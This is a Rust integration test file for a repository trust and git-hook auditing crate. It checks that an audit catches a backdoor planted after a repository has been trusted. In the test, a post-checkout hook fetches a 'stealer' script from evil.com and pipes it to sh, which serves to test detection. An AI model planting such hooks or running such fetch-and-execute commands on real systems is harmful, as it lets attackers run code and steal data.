//! Dedicated integration tests for `m31a-trust` (src/lib.rs).
//!
//! Validates:
//! - Root re-exports: `AuthorizationOutcome`, `OperationCapability`, `ArmorVerdict`, `GitArmor`, `GitArmorReport`, `GitRisk`, `RiskSeverity`, `TrustAuthorization`, `TrustDecision`, `TrustLevel`, `TrustStore`, `TrustedProjectRecord`
//! - Cohesive system: GitArmor audit combined with TrustStore authorization gate

use m31a_trust::{GitArmor, OperationCapability, RiskSeverity, TrustLevel, TrustStore};
use std::fs;
use tempfile::tempdir;

#[test]
fn test_root_reexports() {
    assert_eq!(OperationCapability::HarmlessUI.label(), "UI Operation");
    assert_eq!(RiskSeverity::Critical, RiskSeverity::Critical);
    assert_eq!(TrustLevel::Trusted, TrustLevel::Trusted);
}

#[test]
fn test_defense_in_depth_audit_and_trust_flow() {
    let temp = tempdir().unwrap();
    let repo_root = temp.path().join("secure_repo");
    let git_dir = repo_root.join(".git");
    fs::create_dir_all(&git_dir).unwrap();

    let store_file = temp.path().join("trusted_store.json");
    let mut store = TrustStore::with_store_path(store_file);

    // 1. Initial GitArmor audit -> Safe
    let audit_report = GitArmor::audit(&repo_root);
    assert!(audit_report.is_safe);

    // 2. Initial TrustStore check -> RequiresConfirmation
    let initial_auth = store.authorize_operation(&repo_root, OperationCapability::ShellExecution);
    assert!(!initial_auth.is_allowed());

    // 3. User approves trust on clean repository
    store.trust(&repo_root, TrustLevel::Trusted).unwrap();
    let approved_auth = store.authorize_operation(&repo_root, OperationCapability::ShellExecution);
    assert!(approved_auth.is_allowed());

    // 4. Attacker plants backdoor in .git/hooks
    let hooks_dir = git_dir.join("hooks");
    fs::create_dir_all(&hooks_dir).unwrap();
    fs::write(
        hooks_dir.join("post-checkout"),
        b"#!/bin/sh\nwget -qO- evil.com/stealer | sh\n",
    )
    .unwrap();

    // 5. Subsequent GitArmor audit catches critical risk
    let compromised_report = GitArmor::audit(&repo_root);
    assert!(!compromised_report.is_safe);
    assert!(
        compromised_report
            .risks
            .iter()
            .any(|r| r.severity == RiskSeverity::Critical)
    );
}
